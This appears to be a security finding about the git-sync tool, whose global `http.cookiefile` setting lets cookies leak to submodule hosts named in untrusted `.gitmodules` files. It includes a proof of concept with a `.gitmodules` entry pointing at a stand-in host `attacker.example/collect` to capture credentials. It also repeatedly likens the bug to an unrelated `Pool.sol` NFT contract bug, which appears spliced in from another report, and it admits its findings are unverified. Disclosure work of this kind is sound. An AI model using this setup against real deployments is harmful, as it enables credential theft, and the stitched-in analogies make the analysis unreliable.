### Title
Global `http.cookiefile` Credential Leaks to Attacker-Controlled Submodule URLs During Recursive Sync - (File: `main.go`)

### Summary
`git-sync` binds authentication material to the single, fixed `--repo` URL that the operator configures, similar to how `Pool.sol` is meant to bind `buyNFT()` to a single fixed `nftCollection`. However, when `--cookie-file` is used, the cookie file is applied via a **global** git config setting rather than being scoped to `git.repo`, and `configureWorktree()` unconditionally runs `git submodule update --init [--recursive]` against submodule URLs that come from `.gitmodules`, which is untrusted content fetched from the remote repo. This breaks the intended "fixed target" association in the same way `collectionAddress_` broke the fixed `nftCollection` association in the reported bug: an attacker who can push a commit to the synced repo (or to a ref/branch git-sync tracks) can point a submodule at an arbitrary host and have git-sync's credentials (the cookie file) sent to that host.

### Finding Description
`SetupCookieFile` configures the cookie file with `git config --global http.cookiefile <path>`: [1](#0-0) 

This is a **global** git config, not scoped via `http.<url>.cookiefile` or `url.<base>.insteadOf` to `git.repo`. Once configured, every `git` HTTP request made by the process — including submodule fetches — will present these cookies.

`configureWorktree()` runs submodule update unconditionally whenever `git.submodules != submodulesOff` (the default is not off): [2](#0-1) 

The submodule URLs used here are read by git from the `.gitmodules` file that is part of the synced tree — i.e., content that comes from the remote/attacker-controlled repository, not from a value fixed at `git-sync` startup (`git.repo`). This is the direct analog to `Pool.buyNFT()`'s `collectionAddress_`: a security-relevant target (which host receives the authenticated request) is expected to be pinned to a single trusted value (`--repo`) but is instead sourced from data the remote/attacker controls (`.gitmodules`).

By contrast, the other credential mechanisms in this codebase (`--credential`, `--username`/`--password`) are deliberately scoped per URL via `git credential approve` with an explicit `url=` field: [3](#0-2) [4](#0-3) 

Git's native credential store will only hand back credentials for a matching URL, providing the correct scoping the cookie-file path lacks.

### Impact Explanation
If an attacker can push a commit to the tracked ref of the synced repository (a normal, expected git-sync threat model — untrusted repo content), they can add or modify a `.gitmodules` entry pointing to an attacker-controlled HTTP(S) host. On the next sync, `git submodule update --init` will fetch from that host, and because `http.cookiefile` is a global git config rather than URL-scoped, the cookie file's authentication cookies will be sent to the attacker's server, disclosing the credential material configured for the legitimate `--repo`. This maps to "credential or token disclosure" in the accepted impact categories.

### Likelihood Explanation
Requires: (1) `--cookie-file`/`GITSYNC_COOKIE_FILE` authentication is in use, and (2) submodules are not disabled (`--submodules` default is `recursive`, not `off`), and (3) the attacker has push access to the tracked ref (the standard "attacker-pushed commit" threat model for this class of finding). Given cookie-file auth combined with default submodule behavior is a documented, supported configuration, likelihood is moderate — it depends on operator configuration choices (cookie auth + submodules enabled), but no additional non-default flags beyond that are required.

### Recommendation
- Scope cookie authentication to the configured `--repo` host instead of setting `http.cookiefile` globally (e.g., via `http.<url>.cookiefile` or by wrapping submodule fetches with restricted credential scope).
- Consider disallowing or warning when `--submodules` is not `off` together with `--cookie-file`, since cookie files inherently apply per-host rather than per-repo, unlike `--credential`/`--username`, which already use proper URL-scoped `git credential approve`.
- Alternatively, apply `http.cookiefile` config only within the scope of the specific worktree/submodule fetch commands whose target URL is verified against an allow-list, analogous to using the fixed `nftCollection` instead of an attacker-influenced value in the `Pool.sol` fix.

### Proof of Concept
1. Operator runs `git-sync --repo=https://good.example/repo.git --cookie-file --root=/git --link=link` (submodules default to recursive).
2. Attacker with push access to the tracked branch adds `.gitmodules`:
   ```
   [submodule "evil"]
       path = evil
       url = https://attacker.example/collect
   ```
   and commits/pushes it.
3. On the next `SyncRepo` cycle, `configureWorktree()` runs `git submodule update --init --recursive` (`main.go:1733-1747`), causing git to issue an HTTP request to `https://attacker.example/collect`.
4. Because `http.cookiefile` was set with `git config --global` in `SetupCookieFile` (`main.go:2108-2123`), git attaches the configured cookie file's cookies to this request, sending them to `attacker.example` instead of only to `good.example`.

Note: I could not find any URL allow-list, `protocol.*` restriction, or `insteadOf` scoping in this codebase limiting which hosts submodule fetches may target when cookie-file auth is used, and I was not able to trace an in-repo mitigation (e.g., an explicit `http.<repo>.cookiefile` scoping) — this should be verified against the actual current `main.go` implementation in a full checkout, since index coverage for very large files can be incomplete.

// StoreCredentials stores a username and password for later use.
func (git *repoSync) StoreCredentials(ctx context.Context, url, username, password string) error {
	git.log.V(1).Info("storing git credential", "url", redactURL(url))
	git.log.V(9).Info("md5 of credential", "url", url, "username", md5sum(username), "password", md5sum(password))

	creds := fmt.Sprintf("url=%v\nusername=%v\npassword=%v\n", url, username, password)
	_, _, err := git.RunWithStdin(ctx, "", creds, "credential", "approve")
	if err != nil {
		return fmt.Errorf("can't configure git credentials: %w", err)
	}

	return nil
}

func (git *repoSync) SetupCookieFile(ctx context.Context) error {
	git.log.V(1).Info("configuring git cookie file")

	var pathToCookieFile = "/etc/git-secret/cookie_file"

	_, err := os.Stat(pathToCookieFile)
	if err != nil {
		return fmt.Errorf("can't access git cookiefile: %w", err)
	}

	if _, _, err = git.Run(ctx, "", "config", "--global", "http.cookiefile", pathToCookieFile); err != nil {
		return fmt.Errorf("can't configure git cookiefile: %w", err)
	}

	return nil
}
